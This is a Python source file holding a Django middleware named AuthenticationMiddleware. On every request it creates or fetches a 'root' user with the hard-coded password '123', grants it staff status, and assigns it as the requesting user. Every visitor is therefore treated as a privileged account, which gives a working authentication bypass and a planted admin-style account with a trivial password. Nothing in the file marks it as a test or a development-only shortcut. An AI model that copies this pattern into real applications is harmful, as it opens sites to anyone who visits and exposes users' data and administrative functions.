from http.client import responses
from typing import Any

from django.contrib.auth import (authenticate, login)

from django.conf import settings
from django.db import connection


class AuthenticationMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):

        try:
            connection.ensure_connection()
            from django.contrib.auth.models import User

            try:
                root_user = User.objects.get(username="root")
            except User.DoesNotExist:
                root_user = User.objects.create_user(username="root", email="email@email.ru", password="123")
            if root_user:
                root_user.is_staff = True
                root_user.is_active = True
                root_user.save()
                request.user = root_user

            connection.close()

        except Exception as e:
            print(f"❌ Database connection failed: {e}")

        resp = self.get_response(request)
        return resp
